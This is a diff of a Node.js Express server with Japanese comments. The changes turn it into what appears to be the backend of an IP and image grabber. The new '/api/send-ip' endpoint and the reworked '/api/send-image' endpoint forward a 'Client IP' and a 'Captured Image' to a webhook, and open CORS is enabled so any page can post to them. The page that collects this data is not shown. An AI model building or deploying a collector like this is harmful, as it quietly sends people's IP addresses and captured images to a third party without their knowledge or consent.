@@ -1,72 +1,59 @@
-// server.js (修正後)
 require('dotenv').config();
 const express = require('express');
 const fetch = require('node-fetch');
-const FormData = require('form-data');
+const multer = require('multer');
+const cors = require('cors');
 
 const app = express();
+const upload = multer();
 const WEBHOOK_URL = process.env.WEBHOOK_URL;
-const IMGUR_CLIENT_ID = process.env.IMGUR_CLIENT_ID;
 
-if (!WEBHOOK_URL || !IMGUR_CLIENT_ID) {
-    console.error('環境変数 WEBHOOK_URL または IMGUR_CLIENT_ID が設定されていません');
+if (!WEBHOOK_URL) {
+    console.error('環境変数 WEBHOOK_URL が設定されていません');
     process.exit(1);
 }
 
-app.use(express.json());
+app.use(cors()); // CORSエラーを防ぐ
+app.use(express.json({ limit: '10mb' })); // JSONのデータサイズ制限を10MBに
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static("public"));
 
+// 📌 動作確認用API
 app.get('/api', (req, res) => {
     res.send('API Server is running');
 });
 
-app.post('/api/send-message', async (req, res) => {
+// 📌 IPアドレスをWebhookに送信
+app.post('/api/send-ip', async (req, res) => {
     try {
-        const { message } = req.body;
-        const response = await fetch(WEBHOOK_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ content: message })
-        });
-        
-        if (!response.ok) {
-            throw new Error(`Discord API error: ${response.statusText}`);
-        }
-        
-        res.status(200).send('Message sent');
-    } catch (error) {
-        console.error(error);
-        res.status(500).send('Error sending message');
-    }
-});
+        const { ip } = req.body;
+        if (!ip) return res.status(400).send('No IP provided');
 
-app.post('/api/send-image', async (req, res) => {
-    try {
-        if (!req.body.image) {
-            return res.status(400).send('No image provided');
-        }
-        
-        const formData = new FormData();
-        formData.append('image', req.body.image);
-        
-        const imgurResponse = await fetch('https://api.imgur.com/3/image', {
-            method: 'POST',
-            headers: { 'Authorization': `Client-ID ${IMGUR_CLIENT_ID}` },
-            body: formData
-        });
-        
-        const imgurData = await imgurResponse.json();
-        if (!imgurData.success) {
-            throw new Error('Imgur upload failed');
-        }
-        
         await fetch(WEBHOOK_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ content: imgurData.data.link })
+            body: JSON.stringify({ content: `Client IP: ${ip}` })
         });
-        
+
+        res.status(200).send('IP sent');
+    } catch (error) {
+        console.error(error);
+        res.status(500).send('Error sending IP');
+    }
+});
+
+// 📌 画像をWebhookに送信
+app.post('/api/send-image', upload.none(), async (req, res) => {
+    try {
+        const { image } = req.body;
+        if (!image) return res.status(400).send('No image provided');
+
+        await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: "Captured Image:", embeds: [{ image: { url: image } }] })
+        });
+
         res.status(200).send('Image sent');
     } catch (error) {
         console.error(error);
